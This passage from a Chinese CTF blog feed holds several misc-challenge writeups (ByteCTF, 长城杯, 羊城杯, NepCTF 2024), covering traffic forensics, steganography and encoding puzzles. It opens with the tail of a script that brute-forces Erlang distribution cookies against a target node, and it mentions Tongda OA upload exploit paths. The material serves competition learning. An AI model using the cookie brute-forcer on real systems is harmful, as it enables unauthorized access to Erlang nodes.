md5_hash.hexdigest()</span><br><span class="line">  <span class="keyword">return</span> digest == <span class="string">&quot;f0e2967976d3ad1d0e8d2e85e7146f1a&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_interval</span>(<span class="params">arg</span>):</span><br><span class="line">  elms = arg.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">  <span class="keyword">assert</span>(<span class="built_in">len</span>(elms) == <span class="number">3</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">int</span>(elms[<span class="number">0</span>], <span class="number">0</span>), <span class="built_in">int</span>(elms[<span class="number">1</span>], <span class="number">0</span>), <span class="built_in">float</span>(elms[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_distribution</span>(<span class="params">arg</span>):</span><br><span class="line">  intervals = []</span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(arg, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    obj = json.load(f)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> obj:</span><br><span class="line">      <span class="keyword">assert</span>(<span class="string">&#x27;start&#x27;</span> <span class="keyword">in</span> item)</span><br><span class="line">      <span class="keyword">assert</span>(<span class="string">&#x27;stop&#x27;</span> <span class="keyword">in</span> item)</span><br><span class="line">      <span class="keyword">assert</span>(<span class="string">&#x27;prob&#x27;</span> <span class="keyword">in</span> item)</span><br><span class="line">      intervals.append((item[<span class="string">&#x27;start&#x27;</span>], item[<span class="string">&#x27;stop&#x27;</span>], item[<span class="string">&#x27;prob&#x27;</span>]))</span><br><span class="line">  <span class="keyword">return</span> intervals</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">walk_intervals</span>(<span class="params">intervals</span>):</span><br><span class="line">  <span class="keyword">for</span> (start, stop, prob) <span class="keyword">in</span> <span class="built_in">sorted</span>(intervals, key=<span class="keyword">lambda</span> x: x[<span class="number">2</span>], reverse=<span class="literal">True</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(start, stop):</span><br><span class="line">      <span class="keyword">yield</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next_random</span>(<span class="params">x</span>): <span class="keyword">return</span> (x*<span class="number">17059465</span> + <span class="number">1</span>) &amp; <span class="number">0xfffffffff</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">derive_cookie</span>(<span class="params">seed, size</span>):</span><br><span class="line">  x = seed</span><br><span class="line">  cookie = <span class="built_in">bytearray</span>(<span class="string">b&#x27;0&#x27;</span>*size)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    x = next_random(x)</span><br><span class="line">    cookie[i] = <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + ((<span class="number">26</span>*x) // <span class="number">0x1000000000</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">bytes</span>(cookie)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">batched</span>(<span class="params">iterable, n</span>):</span><br><span class="line">  <span class="string">&quot;Batch data into tuples of length n. The last batch may be shorter.&quot;</span></span><br><span class="line">  <span class="comment"># batched(&#x27;ABCDEFG&#x27;, 3) --&gt; ABC DEF G</span></span><br><span class="line">  <span class="keyword">if</span> n &lt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&#x27;n must be at least one&#x27;</span>)</span><br><span class="line">  it = <span class="built_in">iter</span>(iterable)</span><br><span class="line">  <span class="keyword">while</span> batch := <span class="built_in">tuple</span>(islice(it, n)):</span><br><span class="line">    <span class="keyword">yield</span> batch</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">derive_and_authenticate</span>(<span class="params">seed, challenge</span>):</span><br><span class="line">  cookie = derive_cookie(seed, <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">  success = authenticate(cookie,challenge)</span><br><span class="line">  <span class="keyword">if</span> success:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*] seed=<span class="subst">&#123;seed:#x&#125;</span> cookie=<span class="subst">&#123;cookie.decode()&#125;</span>&#x27;</span>)</span><br><span class="line">    (r, w) = success</span><br><span class="line">    w.close()</span><br><span class="line">    <span class="keyword">await</span> w.wait_closed()</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">amain</span>(<span class="params">intervals, sim, target, port</span>):</span><br><span class="line">  <span class="keyword">for</span> seeds <span class="keyword">in</span> batched(walk_intervals(intervals), sim):</span><br><span class="line">    tasks = [asyncio.create_task(derive_and_authenticate(seed, <span class="number">0x60ea7bde</span>)) <span class="keyword">for</span> seed <span class="keyword">in</span> seeds]</span><br><span class="line">    <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  <span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">  parser = argparse.ArgumentParser()</span><br><span class="line">  mutual = parser.add_mutually_exclusive_group(required=<span class="literal">True</span>)</span><br><span class="line">  mutual.add_argument(<span class="string">&#x27;--interval&#x27;</span>, action=<span class="string">&#x27;append&#x27;</span>, <span class="built_in">type</span>=parse_interval)</span><br><span class="line">  mutual.add_argument(<span class="string">&#x27;--distribution&#x27;</span>)</span><br><span class="line">  mutual.add_argument(<span class="string">&#x27;--seed-full-space&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>)</span><br><span class="line">  mutual.add_argument(<span class="string">&#x27;--sim&#x27;</span>, default=<span class="number">16</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line">  parser.add_argument(<span class="string">&#x27;target&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;Erlang node address or FQDN&#x27;</span>)</span><br><span class="line">  parser.add_argument(<span class="string">&#x27;port&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&#x27;Erlang node TCP port&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  args = parser.parse_args()</span><br><span class="line">  <span class="built_in">print</span>(args)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> args.seed_full_space:</span><br><span class="line">    intervals = [parse_interval(<span class="string">&#x27;300000000,500000000,1000&#x27;</span>)]</span><br><span class="line">  <span class="keyword">elif</span> args.distribution:</span><br><span class="line">    intervals = parse_distribution(args.distribution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    intervals = args.interval</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">  asyncio.run(amain(intervals, args.sim, args.target, args.port))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>挂着跑一段时间即可得到结果</p><p><img src="/images/ByteCTF2024%E5%88%9D%E8%B5%9B-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924000420546.png" alt="image-20240924000420546"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> ByteCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>长城杯2024初赛 misc Writeup</title>
      <link href="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/"/>
      <url>/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>最近打的所有比赛中，misc最简单的一次(</p><p>但是由于是两个misc手+一个re手组队，局限性可想而知。。。在这记录一下三道misc题</p></blockquote><h2 id="BrickGame"><a href="#BrickGame" class="headerlink" title="BrickGame"></a>BrickGame</h2><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908192223654.png" alt="image-20240908192223654"></p><p>直接玩通关即可</p><h2 id="漏洞探踪，流量解密"><a href="#漏洞探踪，流量解密" class="headerlink" title="漏洞探踪，流量解密"></a>漏洞探踪，流量解密</h2><h3 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h3><p>经过查看流量与在网上搜索，可以发现这是<a href="https://www.cnblogs.com/T0uch/p/12580789.html">通达OA的洞</a>。根据其原理，可以在给出的日志中搜索&#x2F;ispirit&#x2F;im&#x2F;upload.php，找到攻击来源ip，也就是第二阶段的压缩包的密码192.168.30.234</p><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908194622178.png" alt="image-20240908194622178"></p><h3 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h3><p>根据漏洞的原理，可以知道接下来是通过&#x2F;ispirit&#x2F;interface&#x2F;gateway.php路径的文件上传漏洞，我们直接在流量中过滤出用到这个路径的流</p><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908202627396.png" alt="image-20240908202627396"></p><p>其中有一个流可以看到提示，使用的是RC4加密</p><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908203255737.png" alt="image-20240908203255737"></p><p>还可以从此外的两个流中看到从192.168.1.5下载了一个叫做key的文件和一个叫做raw的文件，过滤出目标为192.168.1.5的流</p><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908203543604.png" alt="image-20240908203543604"></p><p>追踪，可以找到密钥和密文</p><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908203638605.png" alt="image-20240908203638605"></p><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908203713316.png" alt="image-20240908203713316"></p><p>注意这里的密文前跟着密钥，删去以后解密即可得到flag</p><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908204010288.png" alt="image-20240908204010288"></p><h2 id="最安全的加密方式"><a href="#最安全的加密方式" class="headerlink" title="最安全的加密方式"></a>最安全的加密方式</h2><p>过滤http流，追踪一下，可以找到一个脚本和一个rar压缩包</p><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908205114377.png" alt="image-20240908205114377"></p><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908205026982.png" alt="image-20240908205026982"></p><p>导出以后经过尝试，脚本中的pass就是rar压缩包的密码，解压得到大量的md5值。</p><img src="/images/长城杯2024初赛-misc-Writeup/image-20240908205742264.png" alt="image-20240908205742264" style="zoom:50%;" /><p>在cmd5上查了几行可以看出来，这是对flag进行了逐字符求md5值，写个脚本生成一个字典查询拼接即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_md5_dict</span>():</span><br><span class="line"></span><br><span class="line">    md5_dict = &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> ascii_code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line"></span><br><span class="line">        char = <span class="built_in">chr</span>(ascii_code)</span><br><span class="line">    </span><br><span class="line">        hash_object = hashlib.md5(char.encode())</span><br><span class="line">        md5_hash = hash_object.hexdigest()</span><br><span class="line">        md5_dict[md5_hash] = char</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> md5_dict</span><br><span class="line"></span><br><span class="line">md5_dict = generate_md5_dict()</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">a=f.readline().strip()</span><br><span class="line"><span class="keyword">while</span> a:</span><br><span class="line">    s+=md5_dict[a]</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908210036787.png" alt="image-20240908210036787"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 长城杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯2024初赛 Writeup</title>
      <link href="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/"/>
      <url>/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/</url>
      
        <content type="html"><![CDATA[<h2 id="Writeup部分"><a href="#Writeup部分" class="headerlink" title="Writeup部分"></a>Writeup部分</h2><h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024Writeup.pdf">Writeup</a></h4><p>Additional Statement:</p><p>written by <strong>X1cT34m</strong></p><h2 id="复现部分"><a href="#复现部分" class="headerlink" title="复现部分"></a>复现部分</h2><blockquote><p>个人感觉这次羊城杯的misc实在是有点需要脑洞了，做到最后真的是感到穷途末路了，根本不知道接下来应该往什么方向走。。。现在看了其他师傅的wp，感到有的地方确实挺脑洞，但还是有的地方是自己的技术不过关，要学的还有很多。</p></blockquote><h3 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h3><p>下载下来的压缩包有个注释，是base58编码</p><img src="/images/羊城杯2024初赛-Writeup/image-20240828232334149.png" alt="image-20240828232334149" style="zoom:50%;" /><img src="/images/羊城杯2024初赛-Writeup/image-20240828232441329.png" alt="image-20240828232441329" style="zoom:50%;" /><p>FLag.txt中明显是某个文件的十六进制形式，cyberchef用hex转出来导入010可以看出这是个pcapng文件</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240828233209162.png" alt="image-20240828233209162"></p><blockquote><p>当时比赛的时候就是卡在这里了。。。结果没想到接下来的某个步骤其实正好是我最近研究过的一个东西。。。</p></blockquote><p>前面的FLag.txt其实还藏着一层wbstego隐写，密码就是上面zip中的注释</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240828234413048.png" alt="image-20240828234413048"></p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240828234524260.png" alt="image-20240828234524260"></p><p>一看就是SSLKEYLOGFILE，导入解密tls流量</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240828235009581.png" alt="image-20240828235009581"></p><p>发现多出来的http流量中有个GIF，导出</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240828235420564.png" alt="image-20240828235420564"></p><p>简单写个脚本可以发现得到的gif帧与帧之间间隔时间有两种，0.3和2.3，分别对应0和1，得到的二进制串转文本即可得到flag</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_gif_frames</span>(<span class="params">gif_file</span>):</span><br><span class="line">    im = Image.<span class="built_in">open</span>(gif_file)</span><br><span class="line">    im.seek(<span class="number">0</span>)</span><br><span class="line">    delay_times = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            delay_time = im.info.get(<span class="string">&#x27;duration&#x27;</span>, <span class="number">0</span>) / <span class="number">100.0</span></span><br><span class="line">            delay_times.append(delay_time)</span><br><span class="line">            im.seek(im.tell() + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> delay_times</span><br><span class="line">gif_file_path = <span class="string">&#x27;1.gif&#x27;</span></span><br><span class="line">delays = read_gif_frames(gif_file_path)</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i, delay <span class="keyword">in</span> <span class="built_in">enumerate</span>(delays):</span><br><span class="line">    <span class="comment">#print(delay)</span></span><br><span class="line">    <span class="keyword">if</span> delay==<span class="number">0.3</span>:</span><br><span class="line">        s+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(s,<span class="number">2</span>)))</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829003649950.png" alt="image-20240829003649950"></p><h3 id="miaoro"><a href="#miaoro" class="headerlink" title="miaoro"></a>miaoro</h3><p>追踪tcp流，不难发现，GWHT中是请求，后面$$$…$$$之间的是返回的结果。在tcp流13处可以找到有用的东西</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829114444805.png" alt="image-20240829114444805"></p><p>经过base64解码不难发现，这是一个倒置的zip文件</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829151126046.png" alt="image-20240829151126046"></p><p>写个脚本回复一下这个zip文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;download.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">f.readline()</span><br><span class="line">f.readline()</span><br><span class="line">f.readline()</span><br><span class="line">raw=<span class="string">&#x27;&#x27;</span></span><br><span class="line">a=f.readline().strip()</span><br><span class="line"><span class="keyword">while</span> a[:<span class="number">4</span>]!=<span class="string">&#x27;c8d0&#x27;</span>:</span><br><span class="line">    raw+=a[-<span class="number">16</span>:]</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line">raw+=<span class="string">&#x27;4030b405&#x27;</span></span><br><span class="line">raw=raw[::-<span class="number">1</span>]</span><br><span class="line">ff=<span class="built_in">open</span>(<span class="string">&#x27;1.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(raw),<span class="number">2</span>):</span><br><span class="line">    ff.write(<span class="built_in">bytes</span>.fromhex(raw[j:j+<span class="number">2</span>]))</span><br></pre></td></tr></table></figure><p>发现需要密码，再回到流量包去找，最终在tcp流10的GWHT中找到压缩包密码</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829151721392.png" alt="image-20240829151721392"></p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829151737624.png" alt="image-20240829151737624"></p><p>解压出的图片看起来错位了，猜测是宽被修改过，这里将宽和高改成一样即可</p><img src="/images/羊城杯2024初赛-Writeup/image-20240829151911027.png" alt="image-20240829151911027" style="zoom:50%;" /><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829152017519.png" alt="image-20240829152017519"></p><p>得到的是猫猫编码，在网上可以找到[对照表](<a href="https://www.behance.net/gallery/76299757/CAT-font-alphabet?tracking_source=search_projects_recommended%7Ccat">https://www.behance.net/gallery/76299757/CAT-font-alphabet?tracking_source=search_projects_recommended|cat</a> alphabet)，对应着可以解出后半个flag：EBOFDELQDIAA}</p><img src="/images/羊城杯2024初赛-Writeup/image-20240829151911027.png" alt="image-20240829151911027" style="zoom:50%;" /><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829152017519.png" alt="image-20240829152017519"></p><p>得到的是猫猫编码，在网上可以找到<a href="https://www.behance.net/gallery/76299757/CAT-font-alphabet?tracking_source=search_projects_recommended%7Ccat%20alphabet">对照表</a>，对应着可以解出后半个flag：EBOFDELQDIAA}</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829152154193.png" alt="image-20240829152154193"></p><blockquote><p>比赛的时候卡在了这儿，怎么也找不到前半个flag。。。对shiro_attack还是不熟悉。。。</p></blockquote><p>既然这题考了shiro_attack，那肯定得有点shiro的东西。前半个flag其实就藏在shiro的rememberMe里面，在这题里面叫作nekoMiao。</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829153223632.png" alt="image-20240829153223632"></p><p>用工具解一下就可以看到前半个flag：DASCTF{B916CFEB-C40F-45D6-A7BC-</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829153349040.png" alt="image-20240829153349040"></p><h3 id="1z-misc"><a href="#1z-misc" class="headerlink" title="1z_misc"></a>1z_misc</h3><blockquote><p>这题感觉是最抽象的一题，上来纯属猜谜。。。难就难在需要的脑洞太大了。。。反正我是被这个猜谜困住了（T0T)</p></blockquote><p>题目</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">天地玄黄，宇宙洪荒；日月盈昃，辰宿列张；万物芸芸，息息相关；是以十二岁而行二十八宿，其间奥妙，待探寻，显真章。</span><br><span class="line">若女可为11，可为1124......觜可为91，亦可为725......如此往复，周而复始。</span><br><span class="line">祈解其秘：[43,101,55,16,16,1017,28,812,824,43,55,226,101,55,55,415,1017,1027,28,28,617,824,28,812,1027,16,101,16,55,1027,1017,28,16]</span><br></pre></td></tr></table></figure><p>另外还有一个压缩包</p><p>hint</p><img src="/images/羊城杯2024初赛-Writeup/e865c9738431f6d9b72e663f116f8dc.png" alt="e865c9738431f6d9b72e663f116f8dc" style="zoom:50%;" /><p>先来解释一下11和91。11的前一个1指的是地支的第一位子，后一个指的是子对应的三个星宿的第一位女；91的9指的是地支的第九位申，1指的是申对应的三个星宿的第一位觜。</p><p>再来解释一下1124和725。1124的11指的是地支的第十一位戌，24指的是从戌的第一位奎开始逆时针数二十四个正好到女；725的7指的是地支的第七位午，25指的是从午的第一位柳开始逆时针数25个正好到觜。</p><p>因此我们可以解密题目中给的数组，得到如下结果：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">心,胃,心,奎,奎,心,奎,心,胃,心,心,心,胃,心,心,胃,心,奎,奎,奎,奎,胃,奎,心,奎,奎,胃,奎,心,奎,心,奎,奎</span><br></pre></td></tr></table></figure><p>总共只有三种元素，很容易想到摩斯电码，其中，心为.，胃为&#x2F;，奎为-</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829161715362.png" alt="image-20240829161715362"></p><p>这就是解题目给的压缩包的密码，解压得到一张hint.jpg和一个不明二进制文件flag。用010查看flag，再结合hint.jpg中提示的天琴座，不难猜到这是lyra隐写，将flag改名为flag.lyra。</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829162759993.png" alt="image-20240829162759993"></p><p>后面的步骤跟ISCC2024的<a href="https://blog.csdn.net/administratorlws/article/details/139154964?ops_request_misc=%257B%2522request%255Fid%2522%253A%252239915FCB-333C-46C6-879E-240F264B325F%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=39915FCB-333C-46C6-879E-240F264B325F&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-139154964-null-null.142%5Ev100%5Epc_search_result_base4&utm_term=iscc%20%E6%9C%89%E4%BA%BA%E8%AE%A9%E6%88%91%E7%BB%99%E4%BD%A0%E5%B8%A6%E4%B8%AA%E8%AF%9D&spm=1018.2226.3001.4187">有人让我给你带个话</a>这题是一样的，由于<a href="https://blog.csdn.net/qq_36959443/article/details/116136965">lyra工具的安装</a>有点困难，我目前没安装成功，就先不复现下去了(T0T)，以后再用到的时候再研究吧</p><p>flag: DASCTF{W0w!_You_d0_4_g00d_j0b!}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 羊城杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF2024 Writeup</title>
      <link href="/2024/08/26/NepCTF2024-Writeup/"/>
      <url>/2024/08/26/NepCTF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>由于是同一个比赛，writeup和复现就放在同一篇文章里了</p></blockquote><h2 id="Writeup部分"><a href="#Writeup部分" class="headerlink" title="Writeup部分"></a>Writeup部分</h2><h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/NepCTF2024Writeup.pdf">Writeup</a></h4><h2 id="复现部分"><a href="#复现部分" class="headerlink" title="复现部分"></a>复现部分</h2><h3 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h3><h4 id="thief-god"><a href="#thief-god" class="headerlink" title="thief_god"></a>thief_god</h4><blockquote><p>本题中使用的是智能合约安全中的重入攻击，看网上说这已经是很基础的东西了，结果我比赛时弄了大半天都没弄明白。。。该找个时间好好学学区块链了。。。</p></blockquote><h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><p>1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 